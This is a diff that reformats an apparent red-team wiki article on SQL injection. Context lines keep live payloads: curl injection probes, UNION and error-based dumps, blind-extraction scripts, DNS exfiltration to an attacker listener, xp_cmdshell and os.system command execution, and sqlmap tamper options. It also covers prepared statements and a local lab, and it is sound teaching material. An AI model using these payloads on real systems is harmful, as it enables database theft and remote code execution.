@@ -164,27 +164,10 @@
 
 				<article>
 					<h2 id="sql-injection">SQL Injection</h2>
-					<p>
-						Exploiting unsanitized user input in
-						<abbr title="Structured Query Language">SQL</abbr>
-						queries to bypass authentication,
-						extract data, read filesystem files, and achieve remote code execution.
-					</p>
+					<p>Exploiting unsanitized user input in <abbr title="Structured Query Language">SQL</abbr> queries to bypass authentication, extract data, read filesystem files, and achieve remote code execution.</p>
 					<section>
 						<h3 id="overview">Overview</h3>
-						<p>
-							<abbr title="Structured Query Language">SQL</abbr>
-							injection tricks a database into treating user input as query
-							code instead of data. This article shows how to confirm the flaw with a single quote, exploit
-							it with error-based and
-							<code>UNION</code>
-							payloads, and extract data through boolean and time-based blind
-							channels. It then covers file read and write,
-							<abbr title="Not Only SQL">NoSQL</abbr>
-							injection, second-order
-							injection, sqlmap, and the prepared statements that close the hole. By the end you can run a
-							full injection test and explain why parameterized queries stop it.
-						</p>
+						<p><abbr title="Structured Query Language">SQL</abbr> injection tricks a database into treating user input as query code instead of data. This article shows how to confirm the flaw with a single quote, exploit it with error-based and <code>UNION</code> payloads, and extract data through boolean and time-based blind channels. It then covers file read and write, <abbr title="Not Only SQL">NoSQL</abbr> injection, second-order injection, sqlmap, and the prepared statements that close the hole. By the end you can run a full injection test and explain why parameterized queries stop it.</p>
 					</section>
 					<section>
 						<h3 id="required-reading">Required Reading</h3>
@@ -195,17 +178,7 @@
 					</section>
 					<section>
 						<h3 id="the-problem">The Problem</h3>
-						<p>
-							<abbr title="Structured Query Language">SQL</abbr>
-							injection exists wherever user-controlled input is concatenated
-							into a
-							<abbr title="Structured Query Language">SQL</abbr>
-							query string. The database cannot distinguish between
-							<em>code</em>
-							(the query structure) and
-							<em>data</em>
-							(the user's input). When a developer writes:
-						</p>
+						<p><abbr title="Structured Query Language">SQL</abbr> injection exists wherever user-controlled input is concatenated into a <abbr title="Structured Query Language">SQL</abbr> query string. The database cannot distinguish between <em>code</em> (the query structure) and <em>data</em> (the user's input). When a developer writes:</p>
 						<pre class="python">
 # VULNERABLE: string concatenation
 username = request.form[&#39;username&#39;]
@@ -213,37 +186,15 @@ password = request.form[&#39;password&#39;]
 query = f&#34;SELECT * FROM users WHERE username=&#39;{username}&#39; AND password=&#39;{password}&#39;&#34;
 cursor.execute(query)
 						</pre>
-						<p>
-							The attacker supplies
-							<code>&#39; OR 1=1 --</code>
-							as the username, and the executed query becomes:
-						</p>
+						<p>The attacker supplies <code>&#39; OR 1=1 --</code> as the username, and the executed query becomes:</p>
 						<pre class="sql">
 SELECT * FROM users WHERE username=&#39;&#39; OR 1=1 --&#39; AND password=&#39;whatever&#39;
 						</pre>
-						<p>
-							The
-							<code>--</code>
-							comments out the rest.
-							<code>OR 1=1</code>
-							is always true. The query returns all users. This is
-							the simplest form but the principle scales to any injection point:
-							<abbr title="Uniform Resource Locator">URL</abbr>
-							parameters, POST bodies, cookies,
-							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
-							headers,
-							<abbr title="JavaScript Object Notation">JSON</abbr>
-							fields in
-							<abbr title="Not Only SQL">NoSQL</abbr>
-							stores - anywhere data flows into a query interpreter.
-						</p>
+						<p>The <code>--</code> comments out the rest. <code>OR 1=1</code> is always true. The query returns all users. This is the simplest form but the principle scales to any injection point: <abbr title="Uniform Resource Locator">URL</abbr> parameters, POST bodies, cookies, <abbr title="Hypertext Transfer Protocol">HTTP</abbr> headers, <abbr title="JavaScript Object Notation">JSON</abbr> fields in <abbr title="Not Only SQL">NoSQL</abbr> stores - anywhere data flows into a query interpreter.</p>
 					</section>
 					<section>
 						<h3 id="manual-detection-single-quote-method">Manual Detection: Single-Quote Method</h3>
-						<p>
-							The first probe is always a single quote - it breaks the query syntax, and the error message
-							tells you what database and sometimes the query structure.
-						</p>
+						<p>The first probe is always a single quote - it breaks the query syntax, and the error message tells you what database and sometimes the query structure.</p>
 						<pre class="bash">
 # Test parameter &#39;id&#39; for SQLi
 curl -s &#39;https://target.example.com/product?id=1&#39;
@@ -264,14 +215,7 @@ curl -s &#39;https://target.example.com/product?id=1&#39;
 curl -s &#39;https://target.example.com/product?id=1 AND 1=1&#39;   # Should return same as id=1
 curl -s &#39;https://target.example.com/product?id=1 AND 1=2&#39;   # Should return nothing/different
 						</pre>
-						<p>
-							If
-							<code>AND 1=1</code>
-							returns the same result but
-							<code>AND 1=2</code>
-							returns nothing or a different page, the
-							injection is boolean-based. The database is evaluating your injected condition.
-						</p>
+						<p>If <code>AND 1=1</code> returns the same result but <code>AND 1=2</code> returns nothing or a different page, the injection is boolean-based. The database is evaluating your injected condition.</p>
 						<h4 id="double-quote-test">Double Quote Test</h4>
 						<pre class="bash">
 # Some queries use double quotes: SELECT * FROM users WHERE username=&#34;admin&#34;
@@ -289,10 +233,7 @@ curl -s &#39;https://target.example.com/search?q=admin\&#39;&#39;
 					</section>
 					<section>
 						<h3 id="error-based-extraction">Error-Based Extraction</h3>
-						<p>
-							When the database returns error messages, extract data through them. This works by intentionally
-							causing type conversion errors that embed data in the error string.
-						</p>
+						<p>When the database returns error messages, extract data through them. This works by intentionally causing type conversion errors that embed data in the error string.</p>
 						<pre class="bash">
 # MySQL: Extract database version via error
 curl -s &#39;https://target.example.com/product?id=1 AND EXTRACTVALUE(1,CONCAT(0x3a,VERSION()))&#39;
@@ -342,11 +283,7 @@ curl -s &#34;https://target.example.com/product?id=1 AND 1=CONVERT(int, SYSTEM_U
 					</section>
 					<section>
 						<h3 id="union-based-injection">UNION-Based Injection</h3>
-						<p>
-							UNION injection appends attacker-controlled result sets to legitimate queries. Requirements:
-							the original query must return data to the page; you must match the column count; you must find
-							visible output columns.
-						</p>
+						<p>UNION injection appends attacker-controlled result sets to legitimate queries. Requirements: the original query must return data to the page; you must match the column count; you must find visible output columns.</p>
 						<pre class="bash">
 # Step 1: Determine column count via ORDER BY
 curl -s &#39;https://target.example.com/product?id=1 ORDER BY 1&#39;   # works
@@ -386,13 +323,7 @@ curl -s &#34;https://target.example.com/product?id=-1 UNION SELECT 1,string_agg(
 # SQLite: Dump table names
 curl -s &#34;https://target.example.com/product?id=-1 UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type=&#39;table&#39;--&#34;
 						</pre>
-						<p>
-							<b>Note:</b>
-							Use
-							<code>id=-1</code>
-							(a non-existent ID) so the original query returns zero rows and only your
-							UNION data appears. This prevents the legitimate result from obscuring your extracted data.
-						</p>
+						<p><b>Note:</b> Use <code>id=-1</code> (a non-existent ID) so the original query returns zero rows and only your UNION data appears. This prevents the legitimate result from obscuring your extracted data.</p>
 					</section>
 					<section>
 						<h3 id="database-enumeration-reference">Database Enumeration Reference</h3>
@@ -409,7 +340,7 @@ curl -s &#34;https://target.example.com/product?id=-1 UNION SELECT 1,GROUP_CONCA
 							<tbody>
 								<tr>
 									<td align="center">Version</td>
-									<td align="center"><code>@@version</code>,<code>VERSION()</code></td>
+									<td align="center"><code>@@version</code>, <code>VERSION()</code></td>
 									<td align="center"><code>version()</code></td>
 									<td align="center"><code>@@version</code></td>
 									<td align="center"><code>sqlite_version()</code></td>
@@ -423,8 +354,8 @@ curl -s &#34;https://target.example.com/product?id=-1 UNION SELECT 1,GROUP_CONCA
 								</tr>
 								<tr>
 									<td align="center">Current user</td>
-									<td align="center"><code>USER()</code>,<code>CURRENT_USER()</code></td>
-									<td align="center"><code>current_user</code>,<code>user</code></td>
+									<td align="center"><code>USER()</code>, <code>CURRENT_USER()</code></td>
+									<td align="center"><code>current_user</code>, <code>user</code></td>
 									<td align="center"><code>SYSTEM_USER</code></td>
 									<td align="center">N/A</td>
 								</tr>
@@ -444,24 +375,24 @@ curl -s &#34;https://target.example.com/product?id=-1 UNION SELECT 1,GROUP_CONCA
 								</tr>
 								<tr>
 									<td align="center">String concat</td>
-									<td align="center"><code>CONCAT(a,b)</code>,<code>GROUP_CONCAT(c)</code></td>
-									<td align="center"><code>a \|\| b</code>,<code>STRING_AGG(c,&#39;,&#39;)</code></td>
+									<td align="center"><code>CONCAT(a,b)</code>, <code>GROUP_CONCAT(c)</code></td>
+									<td align="center"><code>a \|\| b</code>, <code>STRING_AGG(c,&#39;,&#39;)</code></td>
 									<td align="center"><code>a + b</code></td>
-									<td align="center"><code>a \|\| b</code>,<code>GROUP_CONCAT(c)</code></td>
+									<td align="center"><code>a \|\| b</code>, <code>GROUP_CONCAT(c)</code></td>
 								</tr>
 								<tr>
 									<td align="center">Row limit</td>
 									<td align="center"><code>LIMIT offset,count</code></td>
 									<td align="center"><code>LIMIT count OFFSET n</code></td>
-									<td align="center"><code>TOP</code>,<code>OFFSET...FETCH</code></td>
+									<td align="center"><code>TOP</code>, <code>OFFSET...FETCH</code></td>
 									<td align="center"><code>LIMIT count OFFSET n</code></td>
 								</tr>
 								<tr>
 									<td align="center">Comment</td>
-									<td align="center"><code>--</code>,<code>#</code>,<code>/* */</code></td>
-									<td align="center"><code>--</code>,<code>/* */</code></td>
-									<td align="center"><code>--</code>,<code>/* */</code></td>
-									<td align="center"><code>--</code>,<code>/* */</code></td>
+									<td align="center"><code>--</code>, <code>#</code>, <code>/* */</code></td>
+									<td align="center"><code>--</code>, <code>/* */</code></td>
+									<td align="center"><code>--</code>, <code>/* */</code></td>
+									<td align="center"><code>--</code>, <code>/* */</code></td>
 								</tr>
 								<tr>
 									<td align="center">Subselect in SELECT</td>
@@ -472,7 +403,7 @@ curl -s &#34;https://target.example.com/product?id=-1 UNION SELECT 1,GROUP_CONCA
 								</tr>
 								<tr>
 									<td align="center">String delimiter</td>
-									<td align="center"><code>&#39;</code>or<code>&#34;</code>(modes vary)</td>
+									<td align="center"><code>&#39;</code> or <code>&#34;</code> (modes vary)</td>
 									<td align="center"><code>&#39;</code></td>
 									<td align="center"><code>&#39;</code></td>
 									<td align="center"><code>&#39;</code></td>
@@ -510,13 +441,7 @@ curl -s &#34;https://target.example.com/product?id=-1 UNION SELECT 1,GROUP_CONCA
 					</section>
 					<section>
 						<h3 id="blind-sql-injection-boolean-based">Blind SQL Injection: Boolean-Based</h3>
-						<p>
-							When no errors and no data output appear, blind
-							<abbr title="SQL Injection">SQLi</abbr>
-							extracts data one bit
-							at a time through boolean questions. If the page behaves differently for TRUE vs FALSE conditions,
-							you can ask any yes/no question of the database.
-						</p>
+						<p>When no errors and no data output appear, blind <abbr title="SQL Injection">SQLi</abbr> extracts data one bit at a time through boolean questions. If the page behaves differently for TRUE vs FALSE conditions, you can ask any yes/no question of the database.</p>
 						<pre class="python">
 #!/usr/bin/env python3
 &#34;&#34;&#34;
@@ -589,10 +514,7 @@ print(f&#34;[+] Data: {users}&#34;)
 					</section>
 					<section>
 						<h3 id="blind-sql-injection-time-based">Blind SQL Injection: Time-Based</h3>
-						<p>
-							When there are zero observable differences in response content (same page regardless of TRUE/FALSE),
-							use time delays. The database pauses when your condition is TRUE.
-						</p>
+						<p>When there are zero observable differences in response content (same page regardless of TRUE/FALSE), use time delays. The database pauses when your condition is TRUE.</p>
 						<pre class="bash">
 # MySQL: time-based detection
 curl -s -w &#34;\nTime: %{time_total}s\n&#34; \
@@ -751,16 +673,7 @@ __import__(&#39;os&#39;).system(__import__(&#39;urllib&#39;).parse.unquote(__imp
 					</section>
 					<section>
 						<h3 id="out-of-band-sqli">Out-of-Band SQLi</h3>
-						<p>
-							When the injection is blind and the server firewall blocks inbound connections but allows outbound
-							<abbr title="Domain Name System">DNS</abbr>
-							, exfiltrate data through
-							<abbr title="Domain Name System">DNS</abbr>
-							queries. The attacker
-							receives
-							<abbr title="Domain Name System">DNS</abbr>
-							requests with data encoded in the subdomain.
-						</p>
+						<p>When the injection is blind and the server firewall blocks inbound connections but allows outbound <abbr title="Domain Name System">DNS</abbr> , exfiltrate data through <abbr title="Domain Name System">DNS</abbr> queries. The attacker receives <abbr title="Domain Name System">DNS</abbr> requests with data encoded in the subdomain.</p>
 						<pre class="bash">
 # Prerequisites: set up a DNS listener on your attack box
 # interactsh-client (or Burp Collaborator, or a VPS with tcpdump on port 53)
@@ -791,10 +704,7 @@ curl -s &#34;https://target.example.com/product?id=1&#39;; EXEC xp_cmdshell &#39
 					</section>
 					<section>
 						<h3 id="second-order-sql-injection">Second-Order SQL Injection</h3>
-						<p>
-							Data stored through one request is used unsafely in a later query. The injection point is not
-							where the data enters, but where it is later retrieved.
-						</p>
+						<p>Data stored through one request is used unsafely in a later query. The injection point is not where the data enters, but where it is later retrieved.</p>
 						<pre class="python">
 # VULNERABLE: second-order SQLi example
 # Endpoint 1: User registration — stores username safely (or so it seems)
@@ -824,17 +734,7 @@ def profile():
 					</section>
 					<section>
 						<h3 id="nosql-injection-mongodb">NoSQL Injection (MongoDB)</h3>
-						<p>
-							<abbr title="Not Only SQL">NoSQL</abbr>
-							databases parse query operators from user input when input is passed directly
-							to query objects. Unlike
-							<abbr title="Structured Query Language">SQL</abbr>
-							, the injection manipulates the query
-							<em>structure</em>
-							rather than the query
-							<em>string</em>
-							.
-						</p>
+						<p><abbr title="Not Only SQL">NoSQL</abbr> databases parse query operators from user input when input is passed directly to query objects. Unlike <abbr title="Structured Query Language">SQL</abbr> , the injection manipulates the query <em>structure</em> rather than the query <em>string</em> .</p>
 						<pre class="python">
 # VULNERABLE: Flask + PyMongo
 @app.route(&#39;/login&#39;, methods=[&#39;POST&#39;])
@@ -927,11 +827,7 @@ print(f&#34;\n[+] Password: {password}&#34;)
 					</section>
 					<section>
 						<h3 id="sqlmap-automated-exploitation">SQLmap: Automated Exploitation</h3>
-						<p>
-							<abbr title="Structured Query Language">SQL</abbr>
-							map automates detection, enumeration, and exploitation but
-							understanding the manual methods is necessary to interpret its output and handle edge cases.
-						</p>
+						<p><abbr title="Structured Query Language">SQL</abbr> map automates detection, enumeration, and exploitation but understanding the manual methods is necessary to interpret its output and handle edge cases.</p>
 						<pre class="bash">
 # Basic detection: test all parameters
 sqlmap -u &#39;https://target.example.com/product?id=1&#39; --batch
@@ -983,15 +879,15 @@ sqlmap -u &#39;https://target.example.com/product?id=1&#39; \
 							<tbody>
 								<tr>
 									<td align="center"><code>space2comment</code></td>
-									<td align="center">Spaces -><code>/**/</code></td>
+									<td align="center">Spaces -> <code>/**/</code></td>
 								</tr>
 								<tr>
 									<td align="center"><code>between</code></td>
-									<td align="center"><code>=</code>-><code>BETWEEN</code></td>
+									<td align="center"><code>=</code> -> <code>BETWEEN</code></td>
 								</tr>
 								<tr>
 									<td align="center"><code>randomcase</code></td>
-									<td align="center">Random case:<code>SELECT</code>-><code>sElEcT</code></td>
+									<td align="center">Random case: <code>SELECT</code> -> <code>sElEcT</code></td>
 								</tr>
 								<tr>
 									<td align="center"><code>charencode</code></td>
@@ -1003,23 +899,23 @@ sqlmap -u &#39;https://target.example.com/product?id=1&#39; \
 								</tr>
 								<tr>
 									<td align="center"><code>equaltolike</code></td>
-									<td align="center"><code>=</code>-><code>LIKE</code></td>
+									<td align="center"><code>=</code> -> <code>LIKE</code></td>
 								</tr>
 								<tr>
 									<td align="center"><code>percentage</code></td>
-									<td align="center">Adds<code>%</code>before each character</td>
+									<td align="center">Adds <code>%</code> before each character</td>
 								</tr>
 								<tr>
 									<td align="center"><code>apostrophemask</code></td>
-									<td align="center"><code>&#39;</code>-><code>%EF%BC%87</code>(full-width quote)</td>
+									<td align="center"><code>&#39;</code> -> <code>%EF%BC%87</code> (full-width quote)</td>
 								</tr>
 								<tr>
 									<td align="center"><code>space2hash</code></td>
-									<td align="center">Spaces -><code>%23%0A</code>(# + newline, MySQL comment)</td>
+									<td align="center">Spaces -> <code>%23%0A</code> (# + newline, MySQL comment)</td>
 								</tr>
 								<tr>
 									<td align="center"><code>versionedmorekeywords</code></td>
-									<td align="center">Adds MySQL versioned comments:<code>/*!UNION*/</code></td>
+									<td align="center">Adds MySQL versioned comments: <code>/*!UNION*/</code></td>
 								</tr>
 							</tbody>
 						</table>
@@ -1040,24 +936,8 @@ cursor.execute(&#34;SELECT * FROM users WHERE username=?&#34;, (username,))
 # The query searches for a username that LITERALLY contains the quote characters
 # No injection possible — the query structure cannot be altered by data
 						</pre>
-						<p>
-							The query is sent to the database in two phases: 1.
-							<b>Prepare</b>
-							: The database compiles the
-							query structure (SELECT columns FROM table WHERE condition). After this phase, the query structure
-							is immutable. 1.
-							<b>Execute</b>
-							: Data values are bound to the parameter placeholders. These values
-							are treated strictly as data - never as code.
-						</p>
-						<p>
-							This works for all relational databases and most
-							<abbr title="Not Only SQL">NoSQL</abbr>
-							databases. For MongoDB,
-							use the driver's type-safe query builders instead of passing raw user dictionaries to
-							<code>find()</code>
-							.
-						</p>
+						<p>The query is sent to the database in two phases: 1. <b>Prepare</b> : The database compiles the query structure (SELECT columns FROM table WHERE condition). After this phase, the query structure is immutable. 1. <b>Execute</b> : Data values are bound to the parameter placeholders. These values are treated strictly as data - never as code.</p>
+						<p>This works for all relational databases and most <abbr title="Not Only SQL">NoSQL</abbr> databases. For MongoDB, use the driver's type-safe query builders instead of passing raw user dictionaries to <code>find()</code> .</p>
 						<pre class="python">
 # SECURE: MongoDB with type checking
 from bson import ObjectId
@@ -1072,11 +952,7 @@ def login():
 					</section>
 					<section>
 						<h3 id="manual-exploitation-walkthrough">Manual Exploitation Walkthrough</h3>
-						<p>
-							A step-by-step exploitation of a vulnerable Flask +
-							<abbr title="SQL Injection">SQLi</abbr>
-							te application.
-						</p>
+						<p>A step-by-step exploitation of a vulnerable Flask + <abbr title="SQL Injection">SQLi</abbr> te application.</p>
 						<pre class="python">
 #!/usr/bin/env python3
 &#34;&#34;&#34;
@@ -1217,19 +1093,7 @@ curl -s &#34;http://localhost:5000/login?username=bob&#39;--&amp;password=anythi
 					</section>
 					<section>
 						<h3 id="challenge">Challenge</h3>
-						<p>
-							Write a Go tool that detects boolean-based
-							<abbr title="SQL Injection">SQLi</abbr>
-							. It requests a parameter with
-							a true condition (
-							<code>1 AND 1=1</code>
-							) and a false condition (
-							<code>1 AND 1=2</code>
-							), compares the response
-							length of each against a baseline, and reports when the true branch matches the baseline but
-							the false branch does not. Point it at the vulnerable Flask app from the previous section, or
-							at any authorized target.
-						</p>
+						<p>Write a Go tool that detects boolean-based <abbr title="SQL Injection">SQLi</abbr> . It requests a parameter with a true condition ( <code>1 AND 1=1</code> ) and a false condition ( <code>1 AND 1=2</code> ), compares the response length of each against a baseline, and reports when the true branch matches the baseline but the false branch does not. Point it at the vulnerable Flask app from the previous section, or at any authorized target.</p>
 						<pre class="go">
 package main
 
@@ -1299,14 +1163,7 @@ func main() {
 						<pre class="bash">
 go run sqli-detect.go &#39;http://localhost:5000/&#39; query
 						</pre>
-						<p>
-							A container with
-							<abbr title="SQL Injection">SQLi</abbr>
-							te, My
-							<abbr title="Structured Query Language">SQL</abbr>
-							, and MongoDB
-							targets is provided:
-						</p>
+						<p>A container with <abbr title="SQL Injection">SQLi</abbr> te, My <abbr title="Structured Query Language">SQL</abbr> , and MongoDB targets is provided:</p>
 						<p><a href="/wiki/articles/redteam/sql-injection.Containerfile">sql-injection.Containerfile</a></p>
 						<pre class="bash">
 podman build -t sql-injection -f sql-injection.Containerfile .
